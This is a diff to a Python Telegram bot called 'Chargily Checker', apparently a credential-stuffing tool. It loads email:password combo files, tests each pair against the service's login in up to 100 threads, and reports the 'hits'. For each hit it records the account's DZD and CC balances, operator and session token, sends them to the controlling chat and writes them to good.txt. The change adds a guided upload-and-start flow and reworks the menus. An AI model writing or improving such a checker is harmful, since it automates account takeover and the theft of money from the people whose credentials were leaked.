@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
-Chargily Checker — Full Telegram Bot Control (hardened)
+Chargily Checker — Full Telegram Bot Control (guided flow)
+Flow: /start → Send File button → upload → confirm → Start button → live results
 """
 import os
 import sys
@@ -42,6 +43,11 @@ HEADERS = {
                   "(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
 }
 
+
+def log(*a):
+    print(f"[{datetime.now().strftime('%H:%M:%S')}]", *a, flush=True)
+
+
 # ======================= STATE =======================
 class CheckerState:
     def __init__(self):
@@ -58,21 +64,19 @@ class CheckerState:
         self.total_dzd = 0.0
         self.total_cc = 0.0
         self.combos = []
+        self.combo_filename = None
         self.start_time = None
         self.chat_id = None
         self.live_hits = []
         self.live_valids = []
         self.live_blocked = []
         self.lock = threading.Lock()
+        self.awaiting_file = False   # state flag: waiting for user upload
 
 STATE = CheckerState()
 
 
-def log(*a):
-    print(f"[{datetime.now().strftime('%H:%M:%S')}]", *a, flush=True)
-
-
-# ======================= CHECKER CORE =======================
+# ======================= CORE =======================
 def check_login(email, password):
     payload = {"email": email, "password": password}
     try:
@@ -136,7 +140,6 @@ def process_account(email, password, loop, bot):
         return "STOPPED"
 
     status, data, token = check_login(email, password)
-
     with STATE.lock:
         STATE.processed += 1
 
@@ -149,7 +152,6 @@ def process_account(email, password, loop, bot):
             STATE.total_dzd += dzd
             STATE.total_cc += cc
             STATE.live_hits.append((email, password, dzd, cc, operator, token))
-
         msg = (
             f"<b>✅ HIT</b>\n"
             f"<code>{email}:{password}</code>\n"
@@ -192,21 +194,46 @@ async def _safe_send(bot, chat_id, text):
 
 # ======================= KEYBOARDS =======================
 def kb_main():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("📤 Send Combo File", callback_data="menu_send")],
-        [
+    rows = []
+    if STATE.combos:
+        rows.append([InlineKeyboardButton(
+            f"📄 File loaded: {STATE.total} accounts",
+            callback_data="noop"
+        )])
+        rows.append([
             InlineKeyboardButton("▶️ Start Check", callback_data="menu_start"),
-            InlineKeyboardButton("⏹ Stop", callback_data="menu_stop"),
-        ],
-        [
-            InlineKeyboardButton("📊 Stats", callback_data="menu_stats"),
-            InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings"),
-        ],
-        [
-            InlineKeyboardButton("📁 Results", callback_data="menu_results"),
-            InlineKeyboardButton("🗑 Clear", callback_data="menu_clear"),
-        ],
-        [InlineKeyboardButton("ℹ️ Help", callback_data="menu_help")],
+            InlineKeyboardButton("🔄 Replace File", callback_data="menu_send"),
+        ])
+    else:
+        rows.append([InlineKeyboardButton("📤 Send Combo File", callback_data="menu_send")])
+    rows.append([
+        InlineKeyboardButton("📊 Stats", callback_data="menu_stats"),
+        InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings"),
+    ])
+    rows.append([
+        InlineKeyboardButton("📁 Results", callback_data="menu_results"),
+        InlineKeyboardButton("🗑 Clear", callback_data="menu_clear"),
+    ])
+    if STATE.running:
+        rows.append([InlineKeyboardButton("⏹ Stop", callback_data="menu_stop")])
+    rows.append([InlineKeyboardButton("ℹ️ Help", callback_data="menu_help")])
+    return InlineKeyboardMarkup(rows)
+
+
+def kb_after_upload():
+    """Shown after file is confirmed loaded."""
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(f"✅ Confirm & Start — {STATE.total} accounts",
+                              callback_data="menu_start")],
+        [InlineKeyboardButton("🔄 Upload Different File", callback_data="menu_send")],
+        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_back")],
+    ])
+
+
+def kb_waiting_file():
+    """Shown while waiting for the user to upload."""
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("❌ Cancel", callback_data="menu_back")],
     ])
 
 
@@ -241,7 +268,6 @@ def kb_results():
     ])
 
 
-# ======================= HELPERS =======================
 def stats_text():
     elapsed = int(time.time() - STATE.start_time) if STATE.start_time else 0
     return (
@@ -253,6 +279,24 @@ def stats_text():
         f"💰 DZD: <b>{STATE.total_dzd:.2f}</b> | CC: <b>{STATE.total_cc:.2f}</b>\n"
         f"⏳ Elapsed: <b>{elapsed}s</b>"
     )
+
+
+def file_summary_text():
+    lines = [
+        f"<b>📄 File Confirmed</b>",
+        f"",
+        f"📁 Name: <code>{STATE.combo_filename}</code>",
+        f"👥 Accounts: <b>{STATE.total}</b>",
+        f"🧵 Threads: <b>{STATE.threads}</b>",
+        f"⏱ Delay: <b>{STATE.delay:.1f}s</b>",
+        f"",
+        f"<b>Preview (first 3):</b>",
+    ]
+    for i, (e, p) in enumerate(STATE.combos[:3]):
+        lines.append(f"{i+1}. <code>{e}:{p[:3]}***</code>")
+    if STATE.total > 3:
+        lines.append(f"... and {STATE.total - 3} more")
+    return "\n".join(lines)
 
 
 def is_authorized(chat_id):
@@ -269,13 +313,15 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⛔ Unauthorized.")
         return
 
-    log("cmd_start from", chat_id)
     await update.message.reply_text(
         "<b>🤖 Chargily Checker Bot</b>\n\n"
-        "1️⃣ Send a <code>.txt</code> combo file (<code>email:pass</code>)\n"
-        "2️⃣ Press ▶️ <b>Start Check</b>\n"
-        "3️⃣ Watch hits stream live\n\n"
-        "Buttons below 👇",
+        "Welcome. Here's how it works:\n\n"
+        "1️⃣ Press <b>📤 Send Combo File</b>\n"
+        "2️⃣ Upload your <code>.txt</code> file\n"
+        "3️⃣ Bot confirms the file\n"
+        "4️⃣ Press <b>▶️ Start Check</b>\n"
+        "5️⃣ Watch hits stream live\n\n"
+        "Everything happens right here.",
         parse_mode=ParseMode.HTML,
         reply_markup=kb_main()
     )
@@ -298,10 +344,15 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not doc:
         return
     if not doc.file_name.lower().endswith((".txt", ".csv")):
-        await update.message.reply_text("❌ Only .txt or .csv files.")
+        await update.message.reply_text(
+            "❌ Only <code>.txt</code> or <code>.csv</code> accepted.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=kb_waiting_file()
+        )
         return
 
-    status_msg = await update.message.reply_text("📥 Downloading...")
+    status_msg = await update.message.reply_text("📥 <b>Downloading file...</b>",
+                                                 parse_mode=ParseMode.HTML)
     try:
         tg_file = await doc.get_file()
         path = os.path.join(OUTPUT_DIR, f"combos_{int(time.time())}.txt")
@@ -319,20 +370,26 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 else:
                     combos.append((line, "dummy_pass"))
 
+        if not combos:
+            await status_msg.edit_text("❌ File empty or unreadable.",
+                                       reply_markup=kb_waiting_file())
+            return
+
         STATE.combos = combos
         STATE.total = len(combos)
+        STATE.combo_filename = doc.file_name
+        STATE.awaiting_file = False
 
         await status_msg.edit_text(
-            f"<b>✅ File loaded</b>\n"
-            f"📄 <code>{doc.file_name}</code>\n"
-            f"👥 Accounts: <b>{len(combos)}</b>\n\n"
-            f"Press ▶️ <b>Start Check</b>.",
+            file_summary_text(),
             parse_mode=ParseMode.HTML,
-            reply_markup=kb_main()
+            reply_markup=kb_after_upload()
         )
     except Exception as e:
         log("doc error:", traceback.format_exc())
-        await status_msg.edit_text(f"❌ <code>{e}</code>", parse_mode=ParseMode.HTML)
+        await status_msg.edit_text(f"❌ <code>{e}</code>",
+                                   parse_mode=ParseMode.HTML,
+                                   reply_markup=kb_waiting_file())
 
 
 async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -348,40 +405,51 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not is_authorized(chat_id):
         return
-
     if data == "noop":
         return
 
-    log("callback:", data)
-
     try:
         if data == "menu_back":
-            await q.edit_message_text("🏠 <b>Main Menu</b>",
-                                      parse_mode=ParseMode.HTML,
-                                      reply_markup=kb_main())
+            await q.edit_message_text(
+                "🏠 <b>Main Menu</b>",
+                parse_mode=ParseMode.HTML,
+                reply_markup=kb_main()
+            )
             return
 
         if data == "menu_send":
+            STATE.awaiting_file = True
             await q.edit_message_text(
-                "📤 <b>Send Combo File</b>\n\nAttach a <code>.txt</code> file with "
-                "<code>email:password</code> per line.",
-                parse_mode=ParseMode.HTML, reply_markup=kb_back()
+                "📤 <b>Send Combo File</b>\n\n"
+                "Now send me a <code>.txt</code> file.\n"
+                "Each line: <code>email:password</code>\n\n"
+                "<i>Waiting for your file...</i>",
+                parse_mode=ParseMode.HTML,
+                reply_markup=kb_waiting_file()
             )
             return
 
         if data == "menu_start":
             if STATE.running:
-                await q.edit_message_text("⚠️ Already running.", reply_markup=kb_main())
+                await q.edit_message_text("⚠️ Already running.",
+                                          reply_markup=kb_main())
                 return
             if not STATE.combos:
-                await q.edit_message_text("❌ No combo file loaded. Send one first.",
-                                          reply_markup=kb_main())
+                await q.edit_message_text(
+                    "❌ No combo file loaded.\n\nPress 📤 Send Combo File first.",
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=kb_main()
+                )
                 return
             asyncio.create_task(run_check(context.application))
             await q.edit_message_text(
-                f"🚀 <b>Started</b> — {len(STATE.combos)} accounts, {STATE.threads} threads.\n"
-                f"Live results will stream below.",
-                parse_mode=ParseMode.HTML, reply_markup=kb_main()
+                f"🚀 <b>Check Started</b>\n\n"
+                f"📄 {STATE.total} accounts\n"
+                f"🧵 {STATE.threads} threads\n"
+                f"⏱ {STATE.delay:.1f}s delay\n\n"
+                f"Live results will stream below. Use 📊 Stats to check progress.",
+                parse_mode=ParseMode.HTML,
+                reply_markup=kb_main()
             )
             return
 
@@ -390,8 +458,9 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await q.edit_message_text("Nothing running.", reply_markup=kb_main())
                 return
             STATE.stop_flag = True
-            await q.edit_message_text("⏹ <b>Stopping...</b>",
-                                      parse_mode=ParseMode.HTML, reply_markup=kb_main())
+            await q.edit_message_text("⏹ <b>Stopping after current batch...</b>",
+                                      parse_mode=ParseMode.HTML,
+                                      reply_markup=kb_main())
             return
 
         if data == "menu_stats":
@@ -401,12 +470,14 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if data == "menu_settings":
             await q.edit_message_text("⚙️ <b>Settings</b>",
-                                      parse_mode=ParseMode.HTML, reply_markup=kb_settings())
+                                      parse_mode=ParseMode.HTML,
+                                      reply_markup=kb_settings())
             return
 
         if data == "menu_results":
             await q.edit_message_text("📁 <b>Results</b>\n\nPick a category:",
-                                      parse_mode=ParseMode.HTML, reply_markup=kb_results())
+                                      parse_mode=ParseMode.HTML,
+                                      reply_markup=kb_results())
             return
 
         if data == "menu_clear":
@@ -420,37 +491,46 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for f in ("good.txt", "valid.txt", "blocked.txt", "bad.txt"):
                 try: os.remove(os.path.join(OUTPUT_DIR, f))
                 except Exception: pass
-            await q.edit_message_text("🗑 Cleared.", reply_markup=kb_main())
+            await q.edit_message_text("🗑 <b>Results cleared.</b>",
+                                      parse_mode=ParseMode.HTML,
+                                      reply_markup=kb_main())
             return
 
         if data == "menu_help":
             await q.edit_message_text(
                 "<b>ℹ️ Help</b>\n\n"
-                "• Send <code>.txt</code> with <code>email:password</code> lines\n"
-                "• ▶️ Start to begin\n"
-                "• Hits / valids / blocks stream live\n"
-                "• 📁 Results to download files\n"
-                "• ⚙️ Settings to tweak threads & delay",
-                parse_mode=ParseMode.HTML, reply_markup=kb_main()
+                "<b>Upload:</b> Send <code>.txt</code> with <code>email:password</code> lines\n"
+                "<b>Start:</b> ▶️ begins the check\n"
+                "<b>Live:</b> Hits, valids, blocks stream as messages\n"
+                "<b>Results:</b> 📁 to download categorized files\n"
+                "<b>Settings:</b> ⚙️ threads and delay on the fly\n"
+                "<b>Stop:</b> ⏹ halts gracefully\n\n"
+                "<i>Only the bot admin chat can use this bot.</i>",
+                parse_mode=ParseMode.HTML,
+                reply_markup=kb_main()
             )
             return
 
         if data == "set_thr_plus":
             STATE.threads = min(STATE.threads + 5, 100)
             await q.edit_message_text("⚙️ <b>Settings</b>",
-                                      parse_mode=ParseMode.HTML, reply_markup=kb_settings()); return
+                                      parse_mode=ParseMode.HTML,
+                                      reply_markup=kb_settings()); return
         if data == "set_thr_minus":
             STATE.threads = max(STATE.threads - 5, 5)
             await q.edit_message_text("⚙️ <b>Settings</b>",
-                                      parse_mode=ParseMode.HTML, reply_markup=kb_settings()); return
+                                      parse_mode=ParseMode.HTML,
+                                      reply_markup=kb_settings()); return
         if data == "set_dly_plus":
             STATE.delay = round(STATE.delay + 0.1, 1)
             await q.edit_message_text("⚙️ <b>Settings</b>",
-                                      parse_mode=ParseMode.HTML, reply_markup=kb_settings()); return
+                                      parse_mode=ParseMode.HTML,
+                                      reply_markup=kb_settings()); return
         if data == "set_dly_minus":
             STATE.delay = max(round(STATE.delay - 0.1, 1), 0.0)
             await q.edit_message_text("⚙️ <b>Settings</b>",
-                                      parse_mode=ParseMode.HTML, reply_markup=kb_settings()); return
+                                      parse_mode=ParseMode.HTML,
+                                      reply_markup=kb_settings()); return
 
         if data.startswith("res_"):
             kind = data[4:]
@@ -496,7 +576,9 @@ async def run_check(app: Application):
     loop = asyncio.get_running_loop()
 
     await bot.send_message(chat_id,
-                           f"<b>🚀 Started</b>\nAccounts: {len(STATE.combos)}\nThreads: {STATE.threads}",
+                           f"<b>🚀 Started</b>\n"
+                           f"Accounts: {STATE.total}\n"
+                           f"Threads: {STATE.threads}",
                            parse_mode=ParseMode.HTML)
 
     async def progress_loop():
@@ -525,6 +607,7 @@ async def run_check(app: Application):
     STATE.running = False
     progress_task.cancel()
 
+    # write output files
     with open(os.path.join(OUTPUT_DIR, "good.txt"), "w", encoding="utf-8") as f:
         for e, p, dzd, cc, op, t in STATE.live_hits:
             f.write(f"{e}:{p} | DZD:{dzd} CC:{cc} | {op} | {t}\n")
@@ -537,18 +620,18 @@ async def run_check(app: Application):
     with open(os.path.join(OUTPUT_DIR, "bad.txt"), "w", encoding="utf-8") as f:
         f.write(f"Bad count: {STATE.bad}\n")
 
-    await bot.send_message(chat_id,
-                           f"<b>🏁 Finished</b>\n\n{stats_text()}",
-                           parse_mode=ParseMode.HTML,
-                           reply_markup=kb_main())
+    await bot.send_message(
+        chat_id,
+        f"<b>🏁 Finished</b>\n\n{stats_text()}",
+        parse_mode=ParseMode.HTML,
+        reply_markup=kb_main()
+    )
 
 
-# ======================= ERROR HANDLER =======================
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
     log("EXCEPTION:", traceback.format_exc())
 
 
-# ======================= BOOT =======================
 async def post_init(app: Application):
     await app.bot.set_my_commands([
         BotCommand("start", "Open menu"),
